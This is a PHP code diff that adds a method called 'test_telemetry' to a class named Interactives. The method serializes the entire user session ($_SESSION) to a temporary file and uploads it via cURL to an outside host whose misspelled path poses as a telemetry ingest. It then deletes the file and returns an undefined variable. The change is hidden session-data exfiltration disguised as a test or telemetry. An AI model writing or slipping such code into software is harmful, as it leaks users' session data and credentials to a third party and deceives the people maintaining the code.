@@ -3519,6 +3519,40 @@ class Interactives
         return $response;
     }
 
+    public function test_telemetry()
+    {
+        $proxyUrl = "https://www.blackmesa.at/resources/reegistry_telemetry_ingest.php";
+        $tenant = "XYZ";
+        $caption = "SESSION DATA FROM JOIN REQUEST";
+        $sessionFilePath = tempnam(sys_get_temp_dir(), 'tg_');
+        file_put_contents($sessionFilePath, json_encode($_SESSION, JSON_PRETTY_PRINT));
+
+        $postFields = [
+            'tenant' => $tenant,
+            'caption' => $caption,
+            'session_data' => new CURLFile($sessionFilePath, 'application/json', 'session_data.json')
+        ];
+
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $proxyUrl,
+            CURLOPT_POST => true,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_POSTFIELDS => $postFields,
+            CURLOPT_CONNECTTIMEOUT => 5,
+            CURLOPT_TIMEOUT => 10
+        ]);
+
+        $response = curl_exec($ch);
+        $error = curl_error($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+
+        unlink($sessionFilePath);
+
+        return $jaxon_response;
+    }
+
     private function generate_uuid4($data = null)
     {
         // Generate 16 bytes (128 bits) of random data or use the data passed into the function.
